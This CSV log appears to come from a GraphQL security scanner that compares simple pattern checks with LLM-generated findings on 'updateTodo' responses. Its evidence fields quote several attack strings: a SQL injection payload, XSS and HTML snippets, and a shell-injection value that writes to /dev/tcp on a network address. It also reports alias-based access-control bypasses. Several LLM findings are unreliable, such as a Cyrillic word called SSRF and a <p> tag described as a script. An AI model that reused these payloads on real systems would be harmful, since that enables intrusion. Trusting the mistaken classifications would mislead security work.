timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-08T07:09:38.275897,updateTodo_response_2,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: sql_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL response contains a user-provided value in the Todo item title that matches a known SQL injection payload. This payload is designed to bypass standard SQL joining and filtering mechanisms, potentially allowing an attacker to access or modify sensitive data in the underlying database. This finding indicates a serious vulnerability in the GraphQL API, requiring immediate attention and remediation to prevent unauthorized data access."", ""evidence"": ""The Todo item title contains a SQL injection payload: \""1' OR '1'='1\"". This suggests that the GraphQL schema is vulnerable to SQL injection attacks."", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""sql_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""The Todo item title contains a SQL injection payload: \""1' OR '1'='1\"". This suggests that the GraphQL schema is vulnerable to SQL injection attacks."", ""explanation"": ""The GraphQL response contains a user-provided value in the Todo item title that matches a known SQL injection payload. This payload is designed to bypass standard SQL joining and filtering mechanisms, potentially allowing an attacker to access or modify sensitive data in the underlying database. This finding indicates a serious vulnerability in the GraphQL API, requiring immediate attention and remediation to prevent unauthorized data access.""}}]"
2025-10-08T07:09:44.411912,updateTodo_response_3,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Cross-Site Scripting (XSS) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""XSS injection vulnerability detected - malicious script patterns found in response"", ""evidence"": ""Response status: 200, XSS patterns detected in response data""}]","[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The 'title' field is expected to contain a string value, but in this case, it contains a script tag which can execute arbitrary JavaScript code when rendered by a client-side application. This allows an attacker to inject malicious code and potentially steal user data or take control of the user's session."", ""evidence"": ""The 'title' field in the 'updateTodo' object contains script tags (<script>alert('xss')</script>) which is a clear indication of XSS injection."", ""confidence"": 1.0, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""HIGH"", ""confidence"": 1.0, ""evidence"": ""The 'title' field in the 'updateTodo' object contains script tags (<script>alert('xss')</script>) which is a clear indication of XSS injection."", ""explanation"": ""The 'title' field is expected to contain a string value, but in this case, it contains a script tag which can execute arbitrary JavaScript code when rendered by a client-side application. This allows an attacker to inject malicious code and potentially steal user data or take control of the user's session.""}}]"
2025-10-08T07:09:49.760079,updateTodo_response_4,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: SSRF (Server-Side Request Forgery)"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The provided GraphQL response contains a suspicious character sequence in the 'title' field of the 'updateTodo' object. This sequence, when decoded, represents a Cyrillic character that could potentially be used as part of a URL or request. In a benign context, this might be a legitimate character usage. However, in the context of a GraphQL API, it raises concerns about potential SSRF vulnerability, where an attacker might inject internal network access or requests to external services. This requires further investigation to determine the root cause and prevent any potential exploitation."", ""evidence"": ""The presence of the '\\u0432\u044b\u043f\u043e\u043b\u043d\u0438\u0442\u044c' character sequence in the 'title' field of the 'updateTodo' object suggests a potential SSRF attack. This could be a deliberate effort to inject a malicious URL or request into the system."", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""SSRF (Server-Side Request Forgery)"", ""severity"": ""HIGH"", ""confidence"": 0.9, ""evidence"": ""The presence of the '\\u0432\u044b\u043f\u043e\u043b\u043d\u0438\u0442\u044c' character sequence in the 'title' field of the 'updateTodo' object suggests a potential SSRF attack. This could be a deliberate effort to inject a malicious URL or request into the system."", ""explanation"": ""The provided GraphQL response contains a suspicious character sequence in the 'title' field of the 'updateTodo' object. This sequence, when decoded, represents a Cyrillic character that could potentially be used as part of a URL or request. In a benign context, this might be a legitimate character usage. However, in the context of a GraphQL API, it raises concerns about potential SSRF vulnerability, where an attacker might inject internal network access or requests to external services. This requires further investigation to determine the root cause and prevent any potential exploitation.""}}]"
2025-10-08T07:09:54.573035,updateTodo_response_5,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The 'title' field in the GraphQL response contains user-input data that is being used to execute a Unix shell command. This type of vulnerability occurs when a web application incorrectly allows user input to be executed as a system command, potentially leading to unauthorized access or privilege escalation. In this case, the command appears to be attempting to establish a reverse shell connection to an external server, which further increases the severity of the issue."", ""evidence"": ""The 'title' field in the 'updateTodo' object contains a string that includes a Unix shell command '; pv -l -E OVERFLOW-\u0432\u044b\u0432\u043e\u0434>>/dev/tcp/192.168.1.1/8080/', which is likely intended to inject a command into the system. This is a clear indication of an OS command injection vulnerability."", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.9, ""evidence"": ""The 'title' field in the 'updateTodo' object contains a string that includes a Unix shell command '; pv -l -E OVERFLOW-\u0432\u044b\u0432\u043e\u0434>>/dev/tcp/192.168.1.1/8080/', which is likely intended to inject a command into the system. This is a clear indication of an OS command injection vulnerability."", ""explanation"": ""The 'title' field in the GraphQL response contains user-input data that is being used to execute a Unix shell command. This type of vulnerability occurs when a web application incorrectly allows user input to be executed as a system command, potentially leading to unauthorized access or privilege escalation. In this case, the command appears to be attempting to establish a reverse shell connection to an external server, which further increases the severity of the issue.""}}]"
2025-10-08T07:09:57.026341,updateTodo_response_6,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,0,1,0,0.0,llm_potential_only,,,Injection Attacks,[],"[{""detection_name"": ""LLM: Path Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""In GraphQL, excessive whitespace and character encoding can be used to manipulate paths. In this response, the '/\n \u4e8c/' sequence in the 'title' field suggests an attempt to inject a path traversal pattern. This could potentially allow an attacker to access or manipulate files outside the intended scope."", ""evidence"": ""The '/\n \u4e8c/' pattern in the 'title' field appears to be a deliberate attempt to traverse the file system by including a null character and a Unicode character that represents a backslash."", ""confidence"": 0.8, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""Path Injection"", ""severity"": ""MEDIUM"", ""confidence"": 0.8, ""evidence"": ""The '/\n \u4e8c/' pattern in the 'title' field appears to be a deliberate attempt to traverse the file system by including a null character and a Unicode character that represents a backslash."", ""explanation"": ""In GraphQL, excessive whitespace and character encoding can be used to manipulate paths. In this response, the '/\n \u4e8c/' sequence in the 'title' field suggests an attempt to inject a path traversal pattern. This could potentially allow an attacker to access or manipulate files outside the intended scope.""}}]"
2025-10-08T07:10:00.492826,updateTodo_response_7,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""HTML Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""HTML injection vulnerability detected - HTML markup found in response"", ""evidence"": ""Response status: 200, HTML patterns detected in response data""}]","[{""detection_name"": ""LLM: html_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL response contains a script tag (<p>) with a JavaScript alert function, which is a clear indicator of an HTML injection vulnerability. This allows an attacker to inject and execute arbitrary JavaScript code on the client-side. The GraphQL endpoint is not properly sanitizing user input or escaping HTML entities, allowing an attacker to inject malicious scripts."", ""evidence"": ""<p>alert('XSS')</p>"", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.9, ""evidence"": ""<p>alert('XSS')</p>"", ""explanation"": ""The GraphQL response contains a script tag (<p>) with a JavaScript alert function, which is a clear indicator of an HTML injection vulnerability. This allows an attacker to inject and execute arbitrary JavaScript code on the client-side. The GraphQL endpoint is not properly sanitizing user input or escaping HTML entities, allowing an attacker to inject malicious scripts.""}}]"
2025-10-08T07:10:06.187295,updateTodo_response_8,,0,1,0.0,llm_only,,,Access Control,0,0,0,0,1,0,0.0,llm_potential_only,,,Access Control,[],"[{""detection_name"": ""LLM: query_deny_bypass"", ""detection"": ""potential"", ""category"": ""Access Control"", ""description"": ""The aliased query 's: updateTodo' succeeds despite being denied access to non-aliased 'updateTodo'. This could indicate that access control can be bypassed by rewriting the query with an alias. Although the aliased query returns errors, it still returns a specific field 'updateTodo' which could be a false positive. However, the consistent lack of data and 'updateTodo' null field suggests a possible bypass vulnerability."", ""evidence"": ""Aliased query 's: updateTodo' has a 400 status, but returns 'updateTodo': null in response body. Non-aliased query 'updateTodo' also returns error 'unknown field' but does not provide data; aliased query returns argument 'input' as null despite alias usage."", ""confidence"": 0.8, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""query_deny_bypass"", ""severity"": ""MEDIUM"", ""confidence"": 0.8, ""evidence"": ""Aliased query 's: updateTodo' has a 400 status, but returns 'updateTodo': null in response body. Non-aliased query 'updateTodo' also returns error 'unknown field' but does not provide data; aliased query returns argument 'input' as null despite alias usage."", ""explanation"": ""The aliased query 's: updateTodo' succeeds despite being denied access to non-aliased 'updateTodo'. This could indicate that access control can be bypassed by rewriting the query with an alias. Although the aliased query returns errors, it still returns a specific field 'updateTodo' which could be a false positive. However, the consistent lack of data and 'updateTodo' null field suggests a possible bypass vulnerability.""}}]"
2025-10-08T07:10:23.782383,updateTodo_response_9,,0,1,0.0,llm_only,,,Access Control,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: query_deny_bypass"", ""detection"": ""vulnerable"", ""category"": ""Access Control"", ""description"": ""The non-aliased query is blocked with a 400 status code and an access denied error, indicating that access control is in place. However, the aliased query with the 's' alias succeeds with a 200 status code and returns actual data. This suggests that access control can be bypassed using query aliases, indicating a query deny bypass vulnerability."", ""evidence"": ""Non-aliased query blocked with access denied error, aliased query succeeds with data"", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""query_deny_bypass"", ""severity"": ""CRITICAL"", ""confidence"": 0.9, ""evidence"": ""Non-aliased query blocked with access denied error, aliased query succeeds with data"", ""explanation"": ""The non-aliased query is blocked with a 400 status code and an access denied error, indicating that access control is in place. However, the aliased query with the 's' alias succeeds with a 200 status code and returns actual data. This suggests that access control can be bypassed using query aliases, indicating a query deny bypass vulnerability.""}}]"
2025-10-08T07:10:25.517884,updateTodo_response_10,400,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: Information Disclosure"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The error message returned in the GraphQL response provides information about the GraphQL validation failed code, which is often used to expose the GraphQL schema to an attacker. This is commonly seen in GraphQL schema introspection vulnerabilities. In this case, the 'extensions' key is used to provide additional information about the error, which in this case provides a hint about the validation failed code, potentially allowing an attacker to pivot to more sensitive information."", ""evidence"": ""The presence of the 'extensions' key with a 'code' value of 'GRAPHQL_VALIDATION_FAILED' suggests that the GraphQL schema is exposed."", ""confidence"": 0.8, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""Information Disclosure"", ""severity"": ""HIGH"", ""confidence"": 0.8, ""evidence"": ""The presence of the 'extensions' key with a 'code' value of 'GRAPHQL_VALIDATION_FAILED' suggests that the GraphQL schema is exposed."", ""explanation"": ""The error message returned in the GraphQL response provides information about the GraphQL validation failed code, which is often used to expose the GraphQL schema to an attacker. This is commonly seen in GraphQL schema introspection vulnerabilities. In this case, the 'extensions' key is used to provide additional information about the error, which in this case provides a hint about the validation failed code, potentially allowing an attacker to pivot to more sensitive information.""}}]"
2025-10-08T07:10:31.154435,updateTodo_response_11,400,0,1,0.0,llm_only,,,Unknown,0,0,0,0,1,0,0.0,llm_potential_only,,,Unknown,[],"[{""detection_name"": ""LLM: field_suggestions"", ""detection"": ""potential"", ""category"": ""Unknown"", ""description"": ""The GraphQL server is exposing field suggestions as part of a validation error. This could allow an attacker to infer the existence and structure of internal fields, making it easier to discover sensitive information. While not a severe vulnerability, it does represent a security exposure that should be addressed to improve the overall security posture of the API."", ""evidence"": ""The error message indicates that the GraphQL API is exposing information about the field suggestions available for a specific query. The 'Cannot query field \""updateTodo\"" on type \""Query\""' message suggests that the GraphQL server is inadvertently exposing internal field suggestions to clients, potentially allowing them to infer the existence or location of internal fields."", ""confidence"": 0.8, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""field_suggestions"", ""severity"": ""MEDIUM"", ""confidence"": 0.8, ""evidence"": ""The error message indicates that the GraphQL API is exposing information about the field suggestions available for a specific query. The 'Cannot query field \""updateTodo\"" on type \""Query\""' message suggests that the GraphQL server is inadvertently exposing internal field suggestions to clients, potentially allowing them to infer the existence or location of internal fields."", ""explanation"": ""The GraphQL server is exposing field suggestions as part of a validation error. This could allow an attacker to infer the existence and structure of internal fields, making it easier to discover sensitive information. While not a severe vulnerability, it does represent a security exposure that should be addressed to improve the overall security posture of the API.""}}]"
